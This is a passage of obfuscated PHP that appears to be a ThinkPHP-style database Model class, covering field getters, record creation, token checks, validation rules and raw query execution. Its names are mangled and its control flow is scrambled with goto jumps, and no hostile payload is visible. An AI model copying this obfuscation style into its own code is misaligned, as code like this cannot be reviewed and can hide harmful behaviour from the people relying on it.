($aäšá‘‡† == 1) { if (isset($e†Ö›Ğ‚[$bëñ¶®¡¢])) { $e†Ö›Ğ‚[$cª‰ÛöõÈö] = $e†Ö›Ğ‚[$bëñ¶®¡¢]; unset($e†Ö›Ğ‚[$bëñ¶®¡¢]); } } else { if (isset($e†Ö›Ğ‚[$cª‰ÛöõÈö])) { $e†Ö›Ğ‚[$bëñ¶®¡¢] = $e†Ö›Ğ‚[$cª‰ÛöõÈö]; unset($e†Ö›Ğ‚[$cª‰ÛöõÈö]); } } } } return $e†Ö›Ğ‚; } public function setField($eÄ‘Íè¿æ¦, $AØôŠª›– = '') { if (is_array($eÄ‘Íè¿æ¦)) { $CØŒµœ¸ìë = $eÄ‘Íè¿æ¦; } else { $CØŒµœ¸ìë[$eÄ‘Íè¿æ¦] = $AØôŠª›–; } return $this->save($CØŒµœ¸ìë); } public function setAdd($A’¨÷«Ë³ê, $BÂàÇ¼ÒÛµ = 1) { $Céµµïšî =& $_SERVER[¬ˆÚÂ”Éğä]; $A†ÆÕ±ã© = $A’¨÷«Ë³ê . $Céµµïšî[284] . $BÂàÇ¼ÒÛµ; if ($BÂàÇ¼ÒÛµ < 0) { $A†ÆÕ±ã© = $A’¨÷«Ë³ê . $BÂàÇ¼ÒÛµ; } return $this->setField($A’¨÷«Ë³ê, array($Céµµïšî[285], $A†ÆÕ±ã©)); } public function getField($CÅÊâŠ´½Ò, $b½«®Ììò = null) { $cø‚Ñ‰¥ãµ =& $_SERVER[¬ˆÚÂ”Éğä]; $bºñøØ±[$cø‚Ñ‰¥ãµ[261]] = $CÅÊâŠ´½Ò; $bºñøØ± = $this->_parseOptions($bºñøØ±); $CÅÊâŠ´½Ò = trim($CÅÊâŠ´½Ò); if (strpos($CÅÊâŠ´½Ò, $cø‚Ñ‰¥ãµ[47])) { if (!isset($bºñøØ±[$cø‚Ñ‰¥ãµ[280]])) { $bºñøØ±[$cø‚Ñ‰¥ãµ[280]] = is_numeric($b½«®Ììò) ? $b½«®Ììò : $cø‚Ñ‰¥ãµ[33]; } $DÍçÄŒä¦ç = $this->db->select($bºñøØ±); if (!empty($DÍçÄŒä¦ç)) { goto EÈÂÉæ©£; c³…„ÍÏ…õ: $E¾½Ñ‡åÚè = array_shift($CÅÊâŠ´½Ò); $a±ßÎ´ßÇÒ = array(); $f§•»¡¡·– = count($cÙ‡äì‘Š); goto B”ìŞ’ÉÔ†; EÈÂÉæ©£: $cÙ‡äì‘Š = explode($cø‚Ñ‰¥ãµ[47], $CÅÊâŠ´½Ò); $CÅÊâŠ´½Ò = array_keys($DÍçÄŒä¦ç[0]); $dºæŸàˆ– = array_shift($CÅÊâŠ´½Ò); goto c³…„ÍÏ…õ; B”ìŞ’ÉÔ†: foreach ($DÍçÄŒä¦ç as $DîĞ§‹¢ñ×) { $A¾Ï²Ÿ¶ Ê = $DîĞ§‹¢ñ×[$dºæŸàˆ–]; if (2 == $f§•»¡¡·–) { $a±ßÎ´ßÇÒ[$A¾Ï²Ÿ¶ Ê] = $DîĞ§‹¢ñ×[$E¾½Ñ‡åÚè]; } else { $a±ßÎ´ßÇÒ[$A¾Ï²Ÿ¶ Ê] = is_string($b½«®Ììò) ? implode($b½«®Ììò, $DîĞ§‹¢ñ×) : $DîĞ§‹¢ñ×; } } return $a±ßÎ´ßÇÒ; goto aÔõäò»˜Ä; aÔõäò»˜Ä: } } else { if (!0 !== $b½«®Ììò) { $bºñøØ±[$cø‚Ñ‰¥ãµ[280]] = is_numeric($b½«®Ììò) ? $b½«®Ììò : 1; } if ($b½«®Ììò === $cø‚Ñ‰¥ãµ[243]) { unset($bºñøØ±[$cø‚Ñ‰¥ãµ[280]]); } $DîĞ§‹¢ñ× = $this->db->select($bºñøØ±); if (!empty($DîĞ§‹¢ñ×)) { if ($b½«®Ììò === $cø‚Ñ‰¥ãµ[243]) { return reset($DîĞ§‹¢ñ×[0]); } if (!0 !== $b½«®Ììò && 1 == $bºñøØ±[$cø‚Ñ‰¥ãµ[280]]) { return reset($DîĞ§‹¢ñ×[0]); } foreach ($DîĞ§‹¢ñ× as $bÃÊ¥‘òå†) { $e·é«†Ê’ª[] = $bÃÊ¥‘òå†[$CÅÊâŠ´½Ò]; } return $e·é«†Ê’ª; } } return null; } public function create($CŸË„½Øğ = '', $d‡éê‡¹¶¸ = '') { goto CàŞä‡·¢; a‹§Ñ„Öƒ©: if ($this->autoCheckFields) { $Eõ‹»×¥– = $this->getDbFields(); foreach ($CŸË„½Øğ as $b—¢Ä‹¬ØÊ => $b¤´âù…ŠÒ) { if (!in_array($b—¢Ä‹¬ØÊ, $Eõ‹»×¥–)) { unset($CŸË„½Øğ[$b—¢Ä‹¬ØÊ]); } elseif (MAGIC_QUOTES_GPC && is_string($b¤´âù…ŠÒ)) { $CŸË„½Øğ[$b—¢Ä‹¬ØÊ] = stripslashes($b¤´âù…ŠÒ); } } } $this->autoOperation($CŸË„½Øğ, $d‡éê‡¹¶¸); $this->data = $CŸË„½Øğ; goto Dİ¨¯Íé¾§; Dİ¨¯Íé¾§: return $CŸË„½Øğ; goto Aåèã›¡º•; CàŞä‡·¢: $E„º©¾× =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($CŸË„½Øğ)) { $CŸË„½Øğ = $_POST; } elseif (is_object($CŸË„½Øğ)) { $CŸË„½Øğ = get_object_vars($CŸË„½Øğ); } if (empty($CŸË„½Øğ) || !is_array($CŸË„½Øğ)) { $this->error = think_lang($E„º©¾×[259]); return !1; } goto CòÊË™èñÉ; EÀù†âŸ”: if (isset($Eõ‹»×¥–)) { if (is_string($Eõ‹»×¥–)) { $Eõ‹»×¥– = explode($E„º©¾×[47], $Eõ‹»×¥–); } if (think_config($E„º©¾×[286])) { $Eõ‹»×¥–[] = think_config($E„º©¾×[287]); } foreach ($CŸË„½Øğ as $b—¢Ä‹¬ØÊ => $b¤´âù…ŠÒ) { if (!in_array($b—¢Ä‹¬ØÊ, $Eõ‹»×¥–)) { unset($CŸË„½Øğ[$b—¢Ä‹¬ØÊ]); } } } if (!$this->autoValidation($CŸË„½Øğ, $d‡éê‡¹¶¸)) { return !1; } if (!$this->autoCheckToken($CŸË„½Øğ)) { $this->error = think_lang($E„º©¾×[288]); return !1; } goto a‹§Ñ„Öƒ©; CòÊË™èñÉ: $CŸË„½Øğ = $this->parseFieldsMap($CŸË„½Øğ, 0); $d‡éê‡¹¶¸ = $d‡éê‡¹¶¸ ? $d‡éê‡¹¶¸ : (!empty($CŸË„½Øğ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$E„º©¾×[261]])) { $Eõ‹»×¥– = $this->options[$E„º©¾×[261]]; unset($this->options[$E„º©¾×[261]]); } elseif ($d‡éê‡¹¶¸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Eõ‹»×¥– = $this->insertFields; } elseif ($d‡éê‡¹¶¸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Eõ‹»×¥– = $this->updateFields; } goto EÀù†âŸ”; Aåèã›¡º•: } public function autoCheckToken($cà¯ÉØäâ) { $aíáãğî©õ =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($this->options[$aíáãğî©õ[289]]) && !$this->options[$aíáãğî©õ[289]]) { return !0; } if (think_config($aíáãğî©õ[286])) { $eª¸Ã£ãäÆ = think_config($aíáãğî©õ[287]); if (!isset($cà¯ÉØäâ[$eª¸Ã£ãäÆ]) || Session::get($eª¸Ã£ãäÆ)) { return !1; } list($f£­ÁÄ«™·, $CÕ˜«ŠĞŠ) = explode($aíáãğî©õ[70], $cà¯ÉØäâ[$eª¸Ã£ãäÆ]); if ($CÕ˜«ŠĞŠ && Session::get($eª¸Ã£ãäÆ . $aíáãğî©õ[91] . $f£­ÁÄ«™·) === $CÕ˜«ŠĞŠ) { Session::remove($eª¸Ã£ãäÆ . $aíáãğî©õ[91] . $f£­ÁÄ«™·); return !0; } if (think_config($aíáãğî©õ[290])) { Session::remove($eª¸Ã£ãäÆ . $aíáãğî©õ[91] . $f£­ÁÄ«™·); } return !1; } return !0; } public function regex($aîˆğÁä½, $bÓùƒÕ‘×£) { $cÈ¶ŒÖ’å‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $EåÙùç†ö‰ = array($cÈ¶ŒÖ’å‰[291] => $cÈ¶ŒÖ’å‰[292], $cÈ¶ŒÖ’å‰[293] => $cÈ¶ŒÖ’å‰[294], $cÈ¶ŒÖ’å‰[295] => $cÈ¶ŒÖ’å‰[296], $cÈ¶ŒÖ’å‰[297] => $cÈ¶ŒÖ’å‰[298], $cÈ¶ŒÖ’å‰[299] => $cÈ¶ŒÖ’å‰[300], $cÈ¶ŒÖ’å‰[301] => $cÈ¶ŒÖ’å‰[302], $cÈ¶ŒÖ’å‰[303] => $cÈ¶ŒÖ’å‰[304], $cÈ¶ŒÖ’å‰[278] => $cÈ¶ŒÖ’å‰[305], $cÈ¶ŒÖ’å‰[306] => $cÈ¶ŒÖ’å‰[307]); if (isset($EåÙùç†ö‰[strtolower($bÓùƒÕ‘×£)])) { $bÓùƒÕ‘×£ = $EåÙùç†ö‰[strtolower($bÓùƒÕ‘×£)]; } return preg_match($bÓùƒÕ‘×£, $aîˆğÁä½) === 1; } private function autoOperation(&$FÕĞ­ÚµÊ­, $CéĞç‰Íªö) { $c¼ç¤êÈİÈ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($this->options[$c¼ç¤êÈİÈ[308]])) { $Aäö»àòİˆ = $this->options[$c¼ç¤êÈİÈ[308]]; unset($this->options[$c¼ç¤êÈİÈ[308]]); } elseif (!empty($this->_auto)) { $Aäö»àòİˆ = $this->_auto; } if (isset($Aäö»àòİˆ)) { foreach ($Aäö»àòİˆ as $dä°Ú˜›®¼) { if (empty($dä°Ú˜›®¼[2])) { $dä°Ú˜›®¼[2] = THINK_MODEL_INSERT; } if ($CéĞç‰Íªö == $dä°Ú˜›®¼[2] || $dä°Ú˜›®¼[2] == THINK_MODEL_BOTH) { switch (trim($dä°Ú˜›®¼[3])) { case $c¼ç¤êÈİÈ[309]: case $c¼ç¤êÈİÈ[310]: $dÄ˜Ìê±¡† = isset($dä°Ú˜›®¼[4]) ? (array) $dä°Ú˜›®¼[4] : array(); if (isset($FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]])) { array_unshift($dÄ˜Ìê±¡†, $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]]); } if ($c¼ç¤êÈİÈ[309] == $dä°Ú˜›®¼[3]) { $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]] = call_user_func_array($dä°Ú˜›®¼[1], $dÄ˜Ìê±¡†); } else { $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]] = call_user_func_array(array(&$this, $dä°Ú˜›®¼[1]), $dÄ˜Ìê±¡†); } break; case $c¼ç¤êÈİÈ[261]: $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]] = $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[1]]; break; case $c¼ç¤êÈİÈ[311]: if ($c¼ç¤êÈİÈ[33] === $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]]) { unset($FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]]); } break; case $c¼ç¤êÈİÈ[312]: default: $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]] = $dä°Ú˜›®¼[1]; } if (!1 === $FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]]) { unset($FÕĞ­ÚµÊ­[$dä°Ú˜›®¼[0]]); } } } } return $FÕĞ­ÚµÊ­; } protected function autoValidation($f†÷¸¤Šš, $Dííïì–á‚) { $A©Ú¹ùÑ¨œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($this->options[$A©Ú¹ùÑ¨œ[313]])) { $dÌ®èè¸ù’ = $this->options[$A©Ú¹ùÑ¨œ[313]]; unset($this->options[$A©Ú¹ùÑ¨œ[313]]); } elseif (!empty($this->_validate)) { $dÌ®èè¸ù’ = $this->_validate; } if (isset($dÌ®èè¸ù’)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dÌ®èè¸ù’ as $bƒÄ„¨Š«¯ => $bÑÛ„Ë«ÁÆ) { if (empty($bÑÛ„Ë«ÁÆ[5]) || $bÑÛ„Ë«ÁÆ[5] == THINK_MODEL_BOTH || $bÑÛ„Ë«ÁÆ[5] == $Dííïì–á‚) { if (0 == strpos($bÑÛ„Ë«ÁÆ[2], $A©Ú¹ùÑ¨œ[314]) && strpos($bÑÛ„Ë«ÁÆ[2], $A©Ú¹ùÑ¨œ[315])) { $bÑÛ„Ë«ÁÆ[2] = think_lang(substr($bÑÛ„Ë«ÁÆ[2], 2, -1)); } $bÑÛ„Ë«ÁÆ[3] = isset($bÑÛ„Ë«ÁÆ[3]) ? $bÑÛ„Ë«ÁÆ[3] : THINK_EXISTS_VALIDATE; $bÑÛ„Ë«ÁÆ[4] = isset($bÑÛ„Ë«ÁÆ[4]) ? $bÑÛ„Ë«ÁÆ[4] : $A©Ú¹ùÑ¨œ[316]; switch ($bÑÛ„Ë«ÁÆ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($f†÷¸¤Šš, $bÑÛ„Ë«ÁÆ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A©Ú¹ùÑ¨œ[33] != trim($f†÷¸¤Šš[$bÑÛ„Ë«ÁÆ[0]])) { if (!1 === $this->_validationField($f†÷¸¤Šš, $bÑÛ„Ë«ÁÆ)) { return !1; } } break; default: if (isset($f†÷¸¤Šš[$bÑÛ„Ë«ÁÆ[0]])) { if (!1 === $this->_validationField($f†÷¸¤Šš, $bÑÛ„Ë«ÁÆ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($AÂ³ØíÇœ¬, $b›Äáäñ·Ñ) { if (!1 === $this->_validationFieldItem($AÂ³ØíÇœ¬, $b›Äáäñ·Ñ)) { if ($this->patchValidate) { $this->error[$b›Äáäñ·Ñ[0]] = $b›Äáäñ·Ñ[2]; } else { $this->error = $b›Äáäñ·Ñ[2]; return !1; } } return; } protected function _validationFieldItem($B„¦ÒËˆÀƒ, $c±³ì‘¢•) { $bš¤†…çñ =& $_SERVER[¬ˆÚÂ”Éğä]; switch (strtolower(trim($c±³ì‘¢•[4]))) { case $bš¤†…çñ[309]: case $bš¤†…çñ[310]: $bÀ©ª ¬õœ = isset($c±³ì‘¢•[6]) ? (array) $c±³ì‘¢•[6] : array(); if (is_string($c±³ì‘¢•[0]) && strpos($c±³ì‘¢•[0], $bš¤†…çñ[47])) { $c±³ì‘¢•[0] = explode($bš¤†…çñ[47], $c±³ì‘¢•[0]); } if (is_array($c±³ì‘¢•[0])) { foreach ($c±³ì‘¢•[0] as $D¾°†»ÑËÅ) { $d”‚¦Ö[$D¾°†»ÑËÅ] = $B„¦ÒËˆÀƒ[$D¾°†»ÑËÅ]; } array_unshift($bÀ©ª ¬õœ, $d”‚¦Ö); } else { array_unshift($bÀ©ª ¬õœ, $B„¦ÒËˆÀƒ[$c±³ì‘¢•[0]]); } if ($bš¤†…çñ[309] == $c±³ì‘¢•[4]) { return call_user_func_array($c±³ì‘¢•[1], $bÀ©ª ¬õœ); } else { return call_user_func_array(array(&$this, $c±³ì‘¢•[1]), $bÀ©ª ¬õœ); } case $bš¤†…çñ[317]: return $B„¦ÒËˆÀƒ[$c±³ì‘¢•[0]] == $B„¦ÒËˆÀƒ[$c±³ì‘¢•[1]]; case $bš¤†…çñ[318]: if (is_string($c±³ì‘¢•[0]) && strpos($c±³ì‘¢•[0], $bš¤†…çñ[47])) { $c±³ì‘¢•[0] = explode($bš¤†…çñ[47], $c±³ì‘¢•[0]); } $cÀÆøˆù±± = array(); if (is_array($c±³ì‘¢•[0])) { foreach ($c±³ì‘¢•[0] as $D¾°†»ÑËÅ) { $cÀÆøˆù±±[$D¾°†»ÑËÅ] = $B„¦ÒËˆÀƒ[$D¾°†»ÑËÅ]; } } else { $cÀÆøˆù±±[$c±³ì‘¢•[0]] = $B„¦ÒËˆÀƒ[$c±³ì‘¢•[0]]; } if (!empty($B„¦ÒËˆÀƒ[$this->getPk()])) { $cÀÆøˆù±±[$this->getPk()] = array($bš¤†…çñ[319], $B„¦ÒËˆÀƒ[$this->getPk()]); } if ($this->where($cÀÆøˆù±±)->find()) { return !1; } return !0; default: return $this->check($B„¦ÒËˆÀƒ[$c±³ì‘¢•[0]], $c±³ì‘¢•[1], $c±³ì‘¢•[4]); } } public function check($Bô–˜™ãˆ, $d†ğÄ…¬ù, $F¸ª—ÀÄô = "\x72\x65\x67\145\170") { $eª…‘×·åŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $F¸ª—ÀÄô = strtolower(trim($F¸ª—ÀÄô)); switch ($F¸ª—ÀÄô) { case $eª…‘×·åŠ[7]: case $eª…‘×·åŠ[320]: $d²¼¬Ã„ö = is_array($d†ğÄ…¬ù) ? $d†ğÄ…¬ù : explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù); return $F¸ª—ÀÄô == $eª…‘×·åŠ[7] ? in_array($Bô–˜™ãˆ, $d²¼¬Ã„ö) : !in_array($Bô–˜™ãˆ, $d²¼¬Ã„ö); case $eª…‘×·åŠ[321]: case $eª…‘×·åŠ[322]: if (is_array($d†ğÄ…¬ù)) { $CÁ±ìÑŸ = $d†ğÄ…¬ù[0]; $FÔÁÙˆ›ò– = $d†ğÄ…¬ù[1]; } else { list($CÁ±ìÑŸ, $FÔÁÙˆ›ò–) = explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù); } return $F¸ª—ÀÄô == $eª…‘×·åŠ[321] ? $Bô–˜™ãˆ >= $CÁ±ìÑŸ && $Bô–˜™ãˆ <= $FÔÁÙˆ›ò– : $Bô–˜™ãˆ < $CÁ±ìÑŸ || $Bô–˜™ãˆ > $FÔÁÙˆ›ò–; case $eª…‘×·åŠ[323]: case $eª…‘×·åŠ[324]: return $F¸ª—ÀÄô == $eª…‘×·åŠ[323] ? $Bô–˜™ãˆ == $d†ğÄ…¬ù : $Bô–˜™ãˆ != $d†ğÄ…¬ù; case $eª…‘×·åŠ[325]: $D‘Ú–ŒŠÑµ = mb_strlen($Bô–˜™ãˆ, $eª…‘×·åŠ[326]); if (strpos($d†ğÄ…¬ù, $eª…‘×·åŠ[47])) { list($CÁ±ìÑŸ, $FÔÁÙˆ›ò–) = explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù); return $D‘Ú–ŒŠÑµ >= $CÁ±ìÑŸ && $D‘Ú–ŒŠÑµ <= $FÔÁÙˆ›ò–; } else { return $D‘Ú–ŒŠÑµ == $d†ğÄ…¬ù; } case $eª…‘×·åŠ[327]: list($c‹ñÁ¿åï‡, $F†ïíƒ³¸Ù) = explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù); if (!is_numeric($c‹ñÁ¿åï‡)) { $c‹ñÁ¿åï‡ = strtotime($c‹ñÁ¿åï‡); } if (!is_numeric($F†ïíƒ³¸Ù)) { $F†ïíƒ³¸Ù = strtotime($F†ïíƒ³¸Ù); } return NOW_TIME >= $c‹ñÁ¿åï‡ && NOW_TIME <= $F†ïíƒ³¸Ù; case $eª…‘×·åŠ[328]: return in_array(get_client_ip(), explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù)); case $eª…‘×·åŠ[329]: return !in_array(get_client_ip(), explode($eª…‘×·åŠ[47], $d†ğÄ…¬ù)); case $eª…‘×·åŠ[316]: default: return $this->regex($Bô–˜™ãˆ, $d†ğÄ…¬ù); } } public function query($DÎ‡ŞÍË©, $B²îš¶âã¹ = false) { $D‘ˆßñ œº =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_bool($B²îš¶âã¹) && !is_array($B²îš¶âã¹)) { $B²îš¶âã¹ = func_get_args(); array_shift($B²îš¶âã¹); } $DÎ‡ŞÍË© = str_replace(array($D‘ˆßñ œº[217], $D‘ˆßñ œº[330]), $D‘ˆßñ œº[50], $DÎ‡ŞÍË©); $DÎ‡ŞÍË© = $this->parseSql($DÎ‡ŞÍË©, $B²îš¶âã¹); return $this->db->query($DÎ‡ŞÍË©); } public function execute($c±™‹’‰‘¯, $FÉÁâçÁÁÆ = false) { if (!is_bool($FÉÁâçÁÁÆ) && !is_array($FÉÁâçÁÁÆ)) { $FÉÁâçÁÁÆ = func_get_args(); array_shift($FÉÁâçÁÁÆ); } $c±™‹’‰‘¯ = $this->parseSql($c±™‹’‰‘¯, $FÉÁâçÁÁÆ); return $this->db->execute($c±™‹’‰‘¯); } protected function parseSql($BÙòºô¾ïñ, $dÍß¸ôÛæì) { $a¼ƒ õÑä¨ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!0 === $dÍß¸ôÛæì) { $DÙšİ¢™ò˜ = $this->_parseOptions(); $BÙòºô¾ïñ = $this->db->parseSql($BÙòºô¾ïñ, $DÙšİ¢™ò˜); } elseif (is_array($dÍß¸ôÛæì)) { $dÍß¸ôÛæì = array_map(array($this->db, $a¼ƒ õÑä¨[331]), $dÍß¸ôÛæì); $BÙòºô¾ïñ = vsprintf($BÙòºô¾ïñ, $dÍß¸ôÛæì); } else { $BÙòºô¾ïñ = strtr($BÙòºô¾ïñ, array($a¼ƒ õÑä¨[332] => $this->getTableName(), $a¼ƒ õÑä¨[333] => think_config($a¼ƒ õÑä¨[232]))); } $this->db->setModel($this->name); return $BÙòºô¾ïñ; } public function db($aÙÈÊÌ¼ëŒ = '', $BÅÖ´½• = '', $CÈ¯õÌâœğ = array()) { goto f‡‹ÄÜÌÖŞ; f‡‹ÄÜÌÖŞ: $CË•ê¨‡†Š =& $_SERVER[¬ˆÚÂ”Éğä]; if ($CË•ê¨‡†Š[33] === $aÙÈÊÌ¼ëŒ && $this->db) { return $this->db; } static $CÄ§ëÌÅ‹ö = array(); goto A‚Æäæ”½ ; A‚Æäæ”½ : static $dµè×Íâó‚ = array(); if (!isset($dµè×Íâó‚[$aÙÈÊÌ¼ëŒ]) || isset($dµè×Íâó‚[$aÙÈÊÌ¼ëŒ]) && $BÅÖ´½• && $CÄ§ëÌÅ‹ö[$aÙÈÊÌ¼ëŒ] != $BÅÖ´½•) { if (!empty($BÅÖ´½•) && is_string($BÅÖ´½•) && !1 === strpos($BÅÖ´½•, $CË•ê¨‡†Š[8])) { $BÅÖ´½• = think_config($BÅÖ´½•); } $dµè×Íâó‚[$aÙÈÊÌ¼ëŒ] = Db::getInstance($BÅÖ´½•); } elseif (NULL === $BÅÖ´½•) { $dµè×Íâó‚[$aÙÈÊÌ¼ëŒ]->close(); unset($dµè×Íâó‚[$aÙÈÊÌ¼ëŒ]); return; } if (!empty($CÈ¯õÌâœğ)) { if (is_string($CÈ¯õÌâœğ)) { parse_str($CÈ¯õÌâœğ, $CÈ¯õÌâœğ); } foreach ($CÈ¯õÌâœğ as $Bï·†‡ñ±‡ => $d–õÔå„ƒŸ) { $this->setProperty($Bï·†‡ñ±‡, $d–õÔå„ƒŸ); } } goto eÕÆ¦‚ß; fŞìÍå‰ÖÛ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto cÑËñêùäª; eÕÆ¦‚ß: $CÄ§ëÌÅ‹ö[$aÙÈÊÌ¼ëŒ] = $BÅÖ´½•; $this->db = $dµè×Íâó‚[$aÙÈÊÌ¼ëŒ]; $this->_after_db(); goto fŞìÍå‰ÖÛ; cÑËñêùäª: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Fñ‹Åğ´ôƒ = get_class($this); if ($Fñ‹Åğ´ôƒ == $_SERVER[¬ˆÚÂ”Éğä][334]) { return $this->name; } $this->name = substr($Fñ‹Åğ´ôƒ, 0, -5); } return $this->name; } public function getTableName() { $CšçñÔÓÄÄ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($this->trueTableName)) { $DÇÆ‹°–È¢ = !empty($this->tablePrefix) ? $this->tablePrefix : $CšçñÔÓÄÄ[33]; if (!empty($this->tableName)) { $DÇÆ‹°–È¢ .= $this->tableName; } else { $DÇÆ‹°–È¢ .= think_parse_name($this->name); } $this->trueTableName = strtolower($DÇÆ‹°–È¢); } return (!empty($this->dbName) ? $this->dbName . $CšçñÔÓÄÄ[91] : $CšçñÔÓÄÄ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E²œÍöĞš =& $_SERVER[¬ˆÚÂ”Éğä]; return isset($this->fields[$E²œÍöĞš[239]]) ? $this->fields[$E²œÍöĞš[239]] : $this->pk; } public function getDbFields() { $EÖ¼Š­æªà =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($this->options[$EÖ¼Š­æªà[267]])) { $dô©¾Ú…¥ = $this->db->getFields($this->options[$EÖ¼Š­æªà[267]]); return $dô©¾Ú…¥ ? array_keys($dô©¾Ú…¥) : !1; } if ($this->fields) { $dô©¾Ú…¥ = $this->fields; unset($dô©¾Ú…¥[$EÖ¼Š­æªà[238]], $dô©¾Ú…¥[$EÖ¼Š­æªà[239]], $dô©¾Ú…¥[$EÖ¼Š­æªà[240]], $dô©¾Ú…¥[$EÖ¼Š­æªà[237]]); return $dô©¾Ú…¥; } return !1; } public function data($e°ÎìÃÌ­ = '') { $Cª›´·£ó¯ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Cª›´·£ó¯[33] === $e°ÎìÃÌ­ && !empty($this->data)) { return $this->data; } if (is_object($e°ÎìÃÌ­)) { $e°ÎìÃÌ­ = get_object_vars($e°ÎìÃÌ­); } elseif (is_string($e°ÎìÃÌ­)) { parse_str($e°ÎìÃÌ­, $e°ÎìÃÌ­); } elseif (!is_array($e°ÎìÃÌ­)) { think_exception(think_lang($Cª›´·£ó¯[259])); } $this->data = $e°ÎìÃÌ­; return $this; } public function join($F†‹­ÑØ¼) { $Bäç‚›µà =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($F†‹­ÑØ¼)) { $this->options[$Bäç‚›µà[270]] = $F†‹­ÑØ¼; } elseif (!empty($F†‹­ÑØ¼)) { $this->options[$Bäç‚›µà[270]][] = $F†‹­ÑØ¼; } return $this; } public function union($b‰ø¸†¸ÉÖ, $dË½óÕ·¼í = false) { goto AŒ£ªòèÍ÷; fÉÃê: return $this; goto dùƒ‹Ûßİƒ; F¨êšµ×©: if (is_object($b‰ø¸†¸ÉÖ)) { $b‰ø¸†¸ÉÖ = get_object_vars($b‰ø¸†¸ÉÖ); } if (is_string($b‰ø¸†¸ÉÖ)) { $a½ÇîçÈ†‘ = $b‰ø¸†¸ÉÖ; } elseif (is_array($b‰ø¸†¸ÉÖ)) { if (isset($b‰ø¸†¸ÉÖ[0])) { $this->options[$eÍ›ºÌºé¨[335]] = array_merge($this->options[$eÍ›ºÌºé¨[335]], $b‰ø¸†¸ÉÖ); return $this; } else { $a½ÇîçÈ†‘ = $b‰ø¸†¸ÉÖ; } } else { think_exception(think_lang($eÍ›ºÌºé¨[259])); } $this->options[$eÍ›ºÌºé¨[335]][] = $a½ÇîçÈ†‘; goto fÉÃê; AŒ£ªòèÍ÷: $eÍ›ºÌºé¨ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($b‰ø¸†¸ÉÖ)) { return $this; } if ($dË½óÕ·¼í) { $this->options[$eÍ›ºÌºé¨[335]][$eÍ›ºÌºé¨[336]] = !0; } goto F¨êšµ×©; dùƒ‹Ûßİƒ: } public function cache($e÷ç±…ŞÉ¼ = true, $Aå‡ò³İ—½ = null, $B¾¾ò¸Íò› = '') { $E¹¯¿¦åíã =& $_SERVER[¬ˆÚÂ”Éğä]; if (!1 !== $e÷ç±…ŞÉ¼) { $this->options[$E¹¯¿¦åíã[337]] = array($E¹¯¿¦åíã[89] => $e÷ç±…ŞÉ¼, $E¹¯¿¦åíã[327] => $Aå‡ò³İ—½, $E¹¯¿¦åíã[29] => $B¾¾ò¸Íò›); } return $this; } public function field($BôÎ¿±Ê˜ , $eŞáÑƒº‰ò = false) { $BÎéÙëâ‚Å =& $_SERVER[¬ˆÚÂ”Éğä]; if (!0 === $BôÎ¿±Ê˜ ) { $B¹“ó¤ÔÇ = $this->getDbFields(); $BôÎ¿±Ê˜  = $B¹“ó¤ÔÇ ? $B¹“ó¤ÔÇ : $BÎéÙëâ‚Å[176]; } elseif ($eŞáÑƒº‰ò) { if (is_string($BôÎ¿±Ê˜ )) { $BôÎ¿±Ê˜  = explode($BÎéÙëâ‚Å[47], $BôÎ¿±Ê˜ ); } $B¹“ó¤ÔÇ = $this->getDbFields(); $BôÎ¿±Ê˜  = $B¹“ó¤ÔÇ ? array_diff($B¹“ó¤ÔÇ, $BôÎ¿±Ê˜ ) : $BôÎ¿±Ê˜ ; } $this->options[$BÎéÙëâ‚Å[261]] = $BôÎ¿±Ê˜ ; return $this; } public function scope($AÏ‡¨Á ºŒ = '', $C°Ÿ›ÁÎÒ™ = NULL) { $B’ˆ—Ş±µ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($B’ˆ—Ş±µ[33] === $AÏ‡¨Á ºŒ) { if (isset($this->_scope[$B’ˆ—Ş±µ[34]])) { $eì‹ÄÓí”Â = $this->_scope[$B’ˆ—Ş±µ[34]]; } else { return $this; } } elseif (is_string($AÏ‡¨Á ºŒ)) { $D…°ğ™Ş·ò = explode($B’ˆ—Ş±µ[47], $AÏ‡¨Á ºŒ); $eì‹ÄÓí”Â = array(); foreach ($D…°ğ™Ş·ò as 